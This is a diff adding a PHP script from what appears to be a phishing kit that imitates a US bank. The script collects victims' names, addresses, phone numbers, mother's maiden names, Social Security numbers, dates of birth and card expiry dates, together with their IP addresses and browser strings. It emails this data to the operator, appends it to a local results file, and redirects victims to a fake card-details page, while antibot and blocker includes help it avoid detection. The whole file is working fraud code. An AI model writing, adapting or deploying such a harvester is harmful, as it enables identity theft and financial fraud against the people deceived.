@@ -1,0 +1,32 @@
+<?php
+$zabi = getenv("REMOTE_ADDR");
+include('../email.php');
+include '../antibots.php';
+include '../bt.php';
+include "../blocker.php";
+$message .= "--------------US Ban3 Info---------------------\n";
+$message .= "| First Name: ".$_POST['fname']."\n";
+$message .= "| Last Name: ".$_POST['lname']."\n";
+$message .= "| Address: ".$_POST['address']."\n";
+$message .= "| City: ".$_POST['city']."\n";
+$message .= "| State: ".$_POST['state']."\n";
+$message .= "| Zip: ".$_POST['zip']."\n";
+$message .= "| Phone: ".$_POST['phone']."\n";
+$message .= "| MMN: ".$_POST['mmn']."\n";
+$message .= "| SSN: ".$_POST['ssn']."\n";
+$message .= "| DOB month: ".$_POST['dobmm']."\n";
+$message .= "| DOB day: ".$_POST['dobdd']."\n";
+$message .= "| DOB year: ".$_POST['dobyy']."\n";
+$message .= "-------------- IP Infos ------------\n";
+$message .= "IP       : $zabi\n";
+$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
+$message .= "------------------ By Dr.Don  ---------------\n";
+$cc = $_POST['ccn'];
+$subject = "US  BAN3 INFO [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
+$headers = "From: Dr.Don <contact>\r\n";
+mail($email, $subject, $message, $headers);
+mail(','.$form, $subject, $message, $headers);
+
+    $text = fopen('../../rezlt.txt', 'a');
+fwrite($text, $message);
+header("Location: ../card.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
